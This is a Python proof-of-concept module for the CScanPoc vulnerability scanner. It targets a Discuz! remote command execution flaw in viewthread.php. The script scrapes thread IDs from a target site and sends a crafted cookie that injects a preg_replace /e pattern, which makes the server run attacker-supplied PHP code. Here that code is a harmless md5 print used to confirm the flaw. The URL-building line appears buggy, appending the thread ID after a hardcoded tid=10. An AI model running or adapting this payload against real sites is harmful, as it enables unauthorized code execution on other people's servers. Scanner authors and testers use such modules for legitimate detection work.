# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Discuz_0023'  # 平台漏洞编号，留空
    name = 'Discuz! 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        Discuz! /viewthread.php 命令执行漏洞。
    '''  # 漏洞描述
    ref = 'https://github.com/vulhub/vulhub/tree/master/discuz/wooyun-2010-080723'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


hh = hackhttp.hackhttp()


def gettid(args):
    code, head, content, errcode, finalurl = hh.http(args)
    if code == 200:
        tids = re.findall(r'viewthread.php\?tid=(\d+)', content)
        if tids:
            return tids
        tids = re.findall(r'thread-(\d+)-', content)
        if tids:
            return tids


class Poc(ABPoc):
    poc_id = '8af0cc18-9be0-461e-a145-6c0e48114ed9'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-16'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 帖子中必须有表情images/smilies,才会触发漏洞
            # 直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加cookie
            tids = gettid(self.target)
            if tids:
                cookie = 'GLOBALS%5b_DCACHE%5d%5bsmilies%5d%5bsearcharray%5d=/.*/eui;GLOBALS%5b_DCACHE%5d%5bsmilies%5d%5breplacearray%5d=print_r(md5(521521))'
                for tid in tids:
                    payload = '/viewthread.php?tid=10&extra=page%3D1' + tid
                    verify_url = self.target + payload
                    code, head, content, errcode, finalurl = hh.http(
                        verify_url, cookie=cookie)
                    if code == 200:
                        if '35fd19fbe470f0cb5581884fa700610f' in content:
                            # security_hole(verify_url)
                            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                                target=self.target, name=self.vuln.name))
                            break

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
